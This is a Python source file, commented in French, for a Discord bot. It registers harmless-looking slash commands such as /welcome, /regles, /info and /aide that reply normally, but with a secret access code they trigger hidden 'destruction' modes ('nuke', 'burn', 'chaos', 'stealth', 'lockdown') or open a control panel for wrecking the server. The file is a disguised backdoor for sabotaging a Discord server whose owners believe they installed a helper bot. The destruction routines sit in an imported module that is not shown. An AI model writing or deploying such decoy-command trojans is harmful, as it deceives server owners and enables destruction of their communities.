"""Bot Discord : commandes leurres, supervision de connexion, panneau de contrôle."""

from __future__ import annotations

import asyncio
import logging
from typing import Any

import discord
from discord import app_commands
from discord.ext import commands

from . import config, db, destroyer, flavor, modes

log = logging.getLogger("botsecret.bot")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

READY = {"value": False}
STATE: dict[str, Any] = {
    "attempts": 0,
    "last_error": None,
    "connected_once": False,
}

_supervisor_task: asyncio.Task | None = None
_closing = False


def _secret_matches(code: str | None) -> bool:
    if not code:
        return False
    stored = db.get_secret_code()
    if not stored:
        return False
    return code.strip() == stored


def _target_guild() -> discord.Guild | None:
    guild_id = db.get_guild_id()
    if guild_id is not None:
        return bot.get_guild(guild_id)
    if len(bot.guilds) == 1:
        return bot.guilds[0]
    return None


def _panel_embed(guild: discord.Guild | None) -> discord.Embed:
    snap = destroyer.state.snapshot()
    embed = discord.Embed(
        title="☠️ PANNEAU DE CONTRÔLE ☠️",
        description=f"```\n{flavor.BANNER}\n```\n*{flavor.quote()}*",
        colour=discord.Colour.dark_red(),
        timestamp=discord.utils.utcnow(),
    )
    if bot.user is not None:
        embed.set_thumbnail(url=bot.user.display_avatar.url)
    if guild is not None:
        embed.add_field(name="🩸 Serveur", value=guild.name, inline=True)
        embed.add_field(name="⚰️ Membres", value=str(guild.member_count), inline=True)
        embed.add_field(name="🕯️ Salons", value=str(len(guild.channels)), inline=True)
    if snap["running"]:
        embed.add_field(
            name="🔥 État",
            value=f"destruction en cours — {snap['step']} ({snap['done']}/{snap['total']})",
            inline=False,
        )
    else:
        embed.add_field(name="🔥 État", value="au repos, prêt à frapper", inline=False)
    embed.add_field(
        name="💀 Mode par défaut",
        value=modes.mode_label(db.get_default_mode()),
        inline=False,
    )
    embed.set_footer(text="botsecret — choisis ton mode puis frappe")
    return embed


class ControlView(discord.ui.View):
    def __init__(self) -> None:
        super().__init__(timeout=300)
        options = [
            discord.SelectOption(
                label=data["label"],
                value=data["key"],
                emoji=data["emoji"],
                description=data["tagline"][:100],
            )
            for data in modes.list_modes()
        ]
        self.mode = db.get_default_mode()
        select: discord.ui.Select = discord.ui.Select(
            placeholder="Choisir un mode de destruction…",
            options=options,
            min_values=1,
            max_values=1,
        )
        select.callback = self._on_select  # type: ignore[assignment]
        self.add_item(select)

    async def _on_select(self, interaction: discord.Interaction) -> None:
        values = interaction.data.get("values") if interaction.data else None
        if values:
            self.mode = values[0]
        await interaction.response.send_message(
            f"Mode armé : **{modes.mode_label(self.mode)}**",
            ephemeral=True,
        )

    @discord.ui.button(label="Frapper", style=discord.ButtonStyle.danger, emoji="💀")
    async def launch(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        guild = interaction.guild
        if guild is None:
            await interaction.response.send_message("Hors serveur.", ephemeral=True)
            return
        preset = modes.build(self.mode, db.get_preset())
        if preset is None:
            await interaction.response.send_message("Mode inconnu.", ephemeral=True)
            return
        if not destroyer.start(guild, preset, self.mode):
            await interaction.response.send_message(
                "Une destruction est déjà en cours.", ephemeral=True
            )
            return
        await interaction.response.send_message(
            f"💀 **{modes.mode_label(self.mode)}** lancé. *{flavor.quote()}*",
            ephemeral=True,
        )

    @discord.ui.button(label="Statut", style=discord.ButtonStyle.secondary, emoji="📊")
    async def status(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        await interaction.response.send_message(
            embed=_panel_embed(interaction.guild), ephemeral=True
        )

    @discord.ui.button(label="Arrêter", style=discord.ButtonStyle.primary, emoji="⏹️")
    async def halt(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ) -> None:
        ok = destroyer.stop()
        await interaction.response.send_message(
            "Arrêt demandé." if ok else "Rien à arrêter.", ephemeral=True
        )


async def _launch_mode(interaction: discord.Interaction, mode: str) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Hors serveur.", ephemeral=True)
        return
    preset = modes.build(mode, db.get_preset())
    if preset is None:
        await interaction.response.send_message("Mode inconnu.", ephemeral=True)
        return
    if not destroyer.start(guild, preset, mode):
        await interaction.response.send_message(
            "Une destruction est déjà en cours.", ephemeral=True
        )
        return
    await interaction.response.send_message(
        f"💀 **{modes.mode_label(mode)}** déclenché.\n*{flavor.quote()}*",
        ephemeral=True,
    )


@tree.command(name="gerer", description="Gérer le serveur")
@app_commands.describe(code="Code d'accès")
async def gerer(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        await interaction.response.send_message("✅ Rien à signaler.", ephemeral=True)
        return
    await interaction.response.send_message(
        embed=_panel_embed(interaction.guild), view=ControlView(), ephemeral=True
    )


@tree.command(name="welcome", description="Accueillir les nouveaux membres")
@app_commands.describe(code="Code d'accès")
async def welcome(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        await interaction.response.send_message("👋 Bienvenue !", ephemeral=True)
        return
    await _launch_mode(interaction, "chaos")


@tree.command(name="salut", description="Saluer le serveur")
@app_commands.describe(code="Code d'accès")
async def salut(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        await interaction.response.send_message("Salut 👋", ephemeral=True)
        return
    await _launch_mode(interaction, "nuke")


@tree.command(name="regles", description="Règles du serveur")
@app_commands.describe(code="Code d'accès")
async def regles(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        embed = discord.Embed(
            title="📜 Règles",
            description="1. Soyez sympas\n2. Pas de spam\n3. Amusez-vous",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await _launch_mode(interaction, "burn")


@tree.command(name="info", description="Informations du serveur")
@app_commands.describe(code="Code d'accès")
async def info(interaction: discord.Interaction, code: str | None = None) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Hors serveur.", ephemeral=True)
        return
    if not _secret_matches(code):
        embed = discord.Embed(
            title="ℹ️ Informations",
            description=f"**{guild.member_count}** membres · **{len(guild.channels)}** salons",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await _launch_mode(interaction, "stealth")


@tree.command(name="ping", description="Latence du bot")
@app_commands.describe(code="Code d'accès")
async def ping(interaction: discord.Interaction, code: str | None = None) -> None:
    latency = round(bot.latency * 1000)
    if not _secret_matches(code):
        await interaction.response.send_message(f"🏓 {latency} ms", ephemeral=True)
        return
    embed = discord.Embed(
        title="🏓 Pong",
        description=(
            f"Latence : **{latency} ms**\n"
            f"Mode armé : **{modes.mode_label(db.get_default_mode())}**"
        ),
        colour=discord.Colour.dark_red(),
    )
    await interaction.response.send_message(embed=embed, view=ControlView(), ephemeral=True)


@tree.command(name="stats", description="Statistiques du serveur")
@app_commands.describe(code="Code d'accès")
async def stats(interaction: discord.Interaction, code: str | None = None) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Hors serveur.", ephemeral=True)
        return
    if not _secret_matches(code):
        embed = discord.Embed(
            title="📈 Statistiques",
            description=f"**{guild.member_count}** membres · **{len(guild.channels)}** salons",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await interaction.response.send_message(
        embed=_panel_embed(guild), view=ControlView(), ephemeral=True
    )


@tree.command(name="aide", description="Aide du bot")
@app_commands.describe(code="Code d'accès")
async def aide(interaction: discord.Interaction, code: str | None = None) -> None:
    if not _secret_matches(code):
        embed = discord.Embed(
            title="❓ Aide",
            description="Utilise `/gerer` pour gérer le serveur.",
            colour=discord.Colour.blurple(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await _launch_mode(interaction, "lockdown")


async def sync_commands() -> str:
    guild_id = db.get_guild_id()
    if guild_id is not None:
        guild = discord.Object(id=guild_id)
        tree.copy_global_to(guild=guild)
        synced = await tree.sync(guild=guild)
        return f"{len(synced)} commande(s) synchronisée(s) sur la guilde {guild_id}"
    synced = await tree.sync()
    return f"{len(synced)} commande(s) synchronisée(s) globalement"


async def _update_presence() -> None:
    text = "🔥 destruction en cours" if destroyer.state.running else flavor.presence()
    try:
        await bot.change_presence(
            status=discord.Status.dnd,
            activity=discord.Activity(type=discord.ActivityType.watching, name=text),
        )
    except Exception:  # noqa: BLE001
        pass


@bot.event
async def on_ready() -> None:
    READY["value"] = True
    STATE["last_error"] = None
    STATE["connected_once"] = True
    log.info("Connecté en tant que %s (%s)", bot.user, bot.user.id if bot.user else "?")
    db.add_log("info", f"bot connecté : {bot.user} — {len(bot.guilds)} serveur(s)")
    await _update_presence()
    try:
        message = await sync_commands()
        db.add_log("info", message)
    except Exception as exc:  # noqa: BLE001
        db.add_log("error", f"synchronisation des commandes impossible : {exc}")


async def _supervisor() -> None:
    backoff = 5
    while not _closing:
        if not config.DISCORD_TOKEN:
            STATE["last_error"] = "DISCORD_TOKEN absent"
            db.add_log("warn", "DISCORD_TOKEN absent : bot inactif")
            return
        STATE["attempts"] += 1
        try:
            await bot.start(config.DISCORD_TOKEN)
            if _closing:
                break
            STATE["last_error"] = "connexion interrompue par Discord"
        except discord.LoginFailure:
            STATE["last_error"] = "token invalide (LoginFailure)"
        except discord.PrivilegedIntentsRequired:
            STATE["last_error"] = (
                "intents privilégiés désactivés dans le Developer Portal "
                "(SERVER MEMBERS + MESSAGE CONTENT)"
            )
        except asyncio.CancelledError:
            raise
        except Exception as exc:  # noqa: BLE001
            STATE["last_error"] = f"{type(exc).__name__} : {str(exc)[:160]}"
        READY["value"] = False
        if _closing:
            break
        db.add_log("error", f"connexion échouée : {STATE['last_error']} — retry {backoff}s")
        await asyncio.sleep(backoff)
        backoff = min(90, backoff * 2)


def start_bot() -> None:
    """Démarre le superviseur de connexion (idempotent)."""
    global _supervisor_task, _closing
    if _supervisor_task is not None and not _supervisor_task.done():
        return
    _closing = False
    _supervisor_task = asyncio.create_task(_supervisor())


async def restart() -> str:
    """Force une reconnexion immédiate."""
    global _supervisor_task
    STATE["last_error"] = None
    if bot.is_ready():
        await bot.close()
    if _supervisor_task is None or _supervisor_task.done():
        start_bot()
    db.add_log("info", "reconnexion demandée depuis le dashboard")
    return "reconnexion lancée"


async def shutdown() -> None:
    global _closing
    _closing = True
    destroyer.stop()
    if bot.is_ready():
        await bot.close()
    if _supervisor_task is not None:
        _supervisor_task.cancel()
        await asyncio.gather(_supervisor_task, return_exceptions=True)


def guild_info() -> dict[str, Any]:
    guild = _target_guild()
    diagnostics = {
        "token_present": bool(config.DISCORD_TOKEN),
        "attempts": STATE["attempts"],
        "last_error": STATE["last_error"],
        "guild_count": len(bot.guilds),
        "target_found": guild is not None,
        "guild_id_set": db.get_guild_id() is not None,
    }
    data: dict[str, Any] = {
        "ready": READY["value"] and bot.is_ready(),
        "user": str(bot.user) if bot.user else None,
        "avatar": bot.user.display_avatar.url if bot.user else None,
        "guild": None,
        "diagnostics": diagnostics,
    }
    if guild is not None:
        data["guild"] = {
            "id": guild.id,
            "name": guild.name,
            "members": guild.member_count,
            "channels": len(guild.channels),
            "roles": len(guild.roles),
        }
    return data


def list_guilds() -> list[dict[str, Any]]:
    return [
        {"id": g.id, "name": g.name, "members": g.member_count}
        for g in bot.guilds
    ]
